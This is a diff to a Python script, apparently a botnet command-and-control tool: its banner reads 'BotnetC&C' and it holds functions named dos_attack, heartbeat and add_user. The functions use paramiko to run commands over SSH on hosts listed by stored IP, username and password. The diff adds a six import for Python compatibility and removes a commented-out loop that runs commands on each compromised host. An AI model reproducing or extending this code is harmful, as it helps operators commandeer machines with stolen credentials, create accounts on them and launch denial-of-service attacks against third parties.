@@ -1,6 +1,6 @@
 import paramiko
 import sys
-
+from six.moves import input as raw_input
 
 def init_text():
 	print( "    ____          __                __     ______ ___     ______\n   / __ ) ____   / /_ ____   ___   / /_   / ____/( _ )   / ____/\n  / __  |/ __ \ / __// __ \ / _ \ / __/  / /    / __ \/|/ /\n / /_/ // /_/ // /_ / / / //  __// /_   / /___ / /_/  </ /__\n/_____/ \____/ \__//_/ /_/ \___/ \__/   \____/ \____/\/\____/\n" )
@@ -52,15 +52,7 @@ def dos_attack(users,attacked_ip):
 def heartbeat(users,user_ip):
 	cmd_="ping "+user_ip+" -c 1"
 	specific_cmd(users, cmd_)
-	'''
-	for u in users:
-		if len(u)>2:
-			try:
-				ip_,uname_,pwd_=u.split("-")
-				exec_cmd(ip_,uname_,pwd_,cmd_)
-			except:
-				print( "Error"
-	'''
+
 
 def add_user(users,username):
 	cmd_="sudo -S useradd "+username+" "
